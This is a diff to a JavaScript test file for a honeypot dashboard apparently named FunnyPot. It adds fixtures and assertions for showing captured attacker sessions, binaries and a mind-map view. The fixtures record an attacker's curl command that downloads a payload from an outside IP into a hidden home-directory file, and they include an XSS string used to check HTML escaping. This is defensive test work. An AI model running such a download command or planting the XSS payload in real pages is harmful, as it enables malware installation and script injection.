@@ -8,7 +8,7 @@ const script = html.match(/<script>([\s\S]*?)<\/script>/)[1];
 new vm.Script(script);
 const elements = new Map();
 function element(id) {
-    if (!elements.has(id)) elements.set(id, { value: id === 'ollamaStatus' ? 'all' : '', textContent: '', innerHTML: '' });
+    if (!elements.has(id)) elements.set(id, { value: id === 'ollamaStatus' ? 'all' : '', textContent: '', innerHTML: '', dataset: {}, addEventListener() {}, querySelectorAll: () => [] });
     return elements.get(id);
 }
 const context = vm.createContext({
@@ -116,4 +116,167 @@ assert.match(element('ollamaConnections').innerHTML, /&lt;img/);
 element('ollamaStatus').value = 'success';
 element('ollamaStatus').oninput();
 assert.match(element('ollamaConnections').innerHTML, /No API connections match/);
-console.log('Frontend: bodyless grouping, body-only pagination, filtered aggregates, total-token metric, overview statistics, paired cards, escaping and optional-data checks passed.');
+
+// Attacker Exchange: caught binaries rendering, session ID/binary search, and 0-command binary sessions.
+const binarySession = {
+    SessionId: '035e6d1ae3bb40ff',
+    StartedAt: '2026-11-25T01:07:37Z',
+    EndedAt: '2026-11-25T01:08:43Z',
+    DurationSeconds: 65.6,
+    RemoteEndpoint: '77.239.124.73:10746',
+    RemoteIp: '77.239.124.73',
+    Username: 'hafih',
+    ClientVersion: 'SSH-2.0-Go',
+    Commands: [{
+        Sequence: 32,
+        ExchangeId: '035e6d1ae3bb40ff:000008',
+        MessageNumber: 8,
+        Command: 'curl -sSL http://103.160.59.94:28816/CZRmrtxnrNONBXhwfFeqjNfBrliNaShG -o ~/.sysmonitor',
+        Timestamp: '2026-11-25T01:08:04Z',
+        HasResponse: true,
+        Response: '',
+        ResponseSource: 'cache',
+    }],
+    Timeline: [{
+        Timestamp: '2026-11-25T01:08:04Z',
+        Event: 'payload_capture',
+        Sequence: 35,
+        ExchangeId: '035e6d1ae3bb40ff:000008',
+        Data: {
+            RemoteEndpoint: '77.239.124.73:10746',
+            Url: 'http://103.160.59.94:28816/CZRmrtxnrNONBXhwfFeqjNfBrliNaShG',
+            Status: 'captured',
+            BytesCaptured: 37797676,
+            Sha256: 'd199756613123b438d94f56f99de082a829c6b93cb78a15bcf1a97630a7a1e24',
+            Path: '/var/log/funnypot/uploads/035e6d1a/20261125010809_CZRmrtxnrNONBXhwfFeqjNfBrliNaShG.quarantine',
+            Analysis: {
+                FileFormat: 'ELF 64-bit LSB',
+                Architecture: 'x86-64',
+                Endianness: 'LSB',
+                BinaryType: 'executable',
+                Summary: 'ELF 64-bit LSB | x86-64 | executable | entropy 8.00 | indicators: packer:UPX',
+                MimeType: 'application/x-executable',
+                Entropy: 8,
+                IsExecutable: true,
+                IsLikelyPackedOrEncrypted: true,
+                SuspiciousIndicators: ['packer:UPX'],
+                NotableStrings: ['jzUPX!', '<img src=x onerror=alert(1)>'],
+            },
+        },
+    }],
+};
+const uploadOnlySession = {
+    SessionId: 'e2a7bfc1df3e43c4',
+    RemoteEndpoint: '77.239.124.63:36270',
+    RemoteIp: '77.239.124.63',
+    Username: 'john',
+    Commands: [],
+    Timeline: [{
+        Timestamp: '2026-11-19T13:27:22Z',
+        Event: 'payload_capture',
+        Data: {
+            RemoteEndpoint: '77.239.124.63:36270',
+            Url: 'http://103.160.59.94:28816/only_binary.elf',
+            Status: 'captured',
+            BytesCaptured: 5242880,
+            Sha256: 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa',
+            Path: '/var/log/funnypot/uploads/e2a7bfc1/only_binary.elf.quarantine',
+            Analysis: { FileFormat: 'ELF 64-bit LSB', Architecture: 'x86-64', BinaryType: 'executable', Entropy: 7.9, IsExecutable: true, IsLikelyPackedOrEncrypted: true },
+        },
+    }],
+};
+context.exchangeSessionsFixture = [binarySession, uploadOnlySession];
+context.exchangeBinariesFixture = [{
+    CapturedAtUtc: '2026-11-25T01:08:09Z',
+    SessionId: '035e6d1ae3bb40ff',
+    ExchangeId: '035e6d1ae3bb40ff:000008',
+    Source: 'url_payload',
+    Status: 'captured',
+    RemoteEndpoint: '77.239.124.73:10746',
+    Username: 'hafih',
+    OriginalFilename: 'CZRmrtxnrNONBXhwfFeqjNfBrliNaShG',
+    StoredFilePath: '/var/log/funnypot/uploads/035e6d1a/20261125010809_CZRmrtxnrNONBXhwfFeqjNfBrliNaShG.quarantine',
+    CapturedBytes: 37797676,
+    Sha256: 'd199756613123b438d94f56f99de082a829c6b93cb78a15bcf1a97630a7a1e24',
+    Analysis: binarySession.Timeline[0].Data.Analysis,
+}];
+vm.runInContext(`
+    window.cachedBinaries = exchangeBinariesFixture;
+    renderDashboard({ TotalSessions: 2, TotalCommands: 1 }, { TotalEvents: 2, EventCounts: {} }, [], {}, exchangeSessionsFixture);
+    setupBinaries(exchangeBinariesFixture, sessionModels);
+`, context);
+const exchangeHtml = element('latestExchanges').innerHTML;
+assert.match(exchangeHtml, /Caught Binary Artifact/);
+assert.match(exchangeHtml, /CZRmrtxnrNONBXhwfFeqjNfBrliNaShG/);
+assert.match(exchangeHtml, /d199756613123b438d94f56f99de082a829c6b93cb78a15bcf1a97630a7a1e24/);
+assert.match(exchangeHtml, /packer:UPX/);
+assert.match(exchangeHtml, /CAUGHT BINARY ARTIFACT/);
+assert.ok(!exchangeHtml.includes('<img src=x'));
+assert.match(exchangeHtml, /&lt;img src=x/);
+assert.equal(vm.runInContext(`exchangeFilters.query = '035e6d1ae3bb'; filteredExchangeSessions(sessionModels).length`, context), 1);
+assert.equal(vm.runInContext(`exchangeFilters.query = 'd19975661312'; filteredExchangeSessions(sessionModels).length`, context), 1);
+assert.equal(vm.runInContext(`exchangeFilters.query = 'e2a7bfc1df3e'; filteredExchangeSessions(sessionModels).length`, context), 1);
+vm.runInContext(`exchangeFilters.query = 'e2a7bfc1df3e'; selectedExchangeSessionId = null; renderLatestExchanges(sessionModels);`, context);
+assert.match(element('latestExchanges').innerHTML, /only_binary\.elf/);
+assert.match(element('latestExchanges').innerHTML, /No shell command transcript recorded/);
+
+// Per-tab clean URL routing (GitHub Pages direct path & 404.html redirect handoff).
+const fourOhFourHtml = fs.readFileSync(new URL('../frontend-main/404.html', import.meta.url), 'utf8');
+assert.match(fourOhFourHtml, /funnypot:redirectPath/);
+assert.match(fourOhFourHtml, /attackerexchange/);
+assert.match(fourOhFourHtml, /attackmindmap/);
+assert.equal(vm.runInContext(`resolveTabFromRoute('AttackerExchange')`, context), 'exchange');
+assert.equal(vm.runInContext(`resolveTabFromRoute('CaughtBinaries')`, context), 'binaries');
+assert.equal(vm.runInContext(`resolveTabFromRoute('AttackMindMap')`, context), 'mindmap');
+assert.equal(vm.runInContext(`resolveTabFromRoute('Ollama')`, context), 'ollama');
+assert.deepEqual(
+    { ...vm.runInContext(`resolveInitialRoute({ pathname: '/FunnyPot.ai/AttackerExchange', search: '', hash: '' }, null)`, context) },
+    { tab: 'exchange', basePath: '/FunnyPot.ai/', fromRedirect: false, hasExplicitRoute: true }
+);
+assert.deepEqual(
+    { ...vm.runInContext(`resolveInitialRoute({ pathname: '/FunnyPot.ai/', search: '', hash: '' }, '/FunnyPot.ai/AttackMindMap')`, context) },
+    { tab: 'mindmap', basePath: '/FunnyPot.ai/', fromRedirect: true, hasExplicitRoute: true }
+);
+assert.equal(vm.runInContext(`tabUrl('exchange', '/FunnyPot.ai/')`, context), '/FunnyPot.ai/AttackerExchange');
+assert.equal(vm.runInContext(`tabUrl('mindmap', '/FunnyPot.ai/')`, context), '/FunnyPot.ai/AttackMindMap');
+assert.match(html, /href="AttackerExchange"/);
+assert.match(html, /href="AttackMindMap"/);
+
+// Attack Mind Map (Pilot): tree rendering, clickable artefact explanations, folding, and escaping.
+vm.runInContext(`
+    exchangeFilters.query = '';
+    mindmapQuery = '';
+    mindmapFilter = 'rich';
+    mindmapSessionId = null;
+    mindmapSelectedNodeId = null;
+    mindmapFoldedNodes = new Set();
+    setupMindMap(sessionModels);
+`, context);
+const mmCanvasInitial = element('mindmapCanvas').innerHTML;
+assert.match(mmCanvasInitial, /hafih@77\.239\.124\.73/);
+assert.match(mmCanvasInitial, /Origin &amp; Access/);
+assert.match(mmCanvasInitial, /Command Kill-Chain/);
+assert.match(mmCanvasInitial, /Caught Binaries &amp; Malware/);
+assert.match(mmCanvasInitial, /CZRmrtxnrNONBXhwfFeqjNfBrliNaShG/);
+assert.match(mmCanvasInitial, /data-mm-fold="branch-binaries"/);
+
+// Clicking an artefact updates the plain-English explainer and safely escapes HTML.
+vm.runInContext(`selectMindMapNode('bin-0-entropy')`, context);
+assert.match(element('mindmapInspector').innerHTML, /Packing &amp; Entropy/);
+assert.match(element('mindmapInspector').innerHTML, /Shannon entropy of 8\.00/);
+assert.match(element('mindmapInspector').innerHTML, /packer:UPX/);
+vm.runInContext(`selectMindMapNode('bin-0-strings')`, context);
+assert.ok(!element('mindmapInspector').innerHTML.includes('<img src=x'));
+assert.match(element('mindmapInspector').innerHTML, /&lt;img src=x/);
+vm.runInContext(`selectMindMapNode('origin-client')`, context);
+assert.match(element('mindmapInspector').innerHTML, /Go standard crypto\/ssh client/);
+
+// Folding a branch hides its children and shows collapsed descendant count; unfolding restores them.
+vm.runInContext(`toggleMindMapFold('branch-binaries')`, context);
+const mmCanvasFolded = element('mindmapCanvas').innerHTML;
+assert.ok(!mmCanvasFolded.includes('data-mm-select="bin-0-entropy"'));
+assert.match(mmCanvasFolded, /data-mm-fold="branch-binaries" aria-expanded="false"[^>]*>\+ /);
+vm.runInContext(`toggleMindMapFold('branch-binaries')`, context);
+assert.match(element('mindmapCanvas').innerHTML, /data-mm-select="bin-0-entropy"/);
+
+console.log('Frontend: all Ollama, Attacker Exchange caught-binary, per-tab clean URL routing, and Attack Mind Map pilot checks passed.');
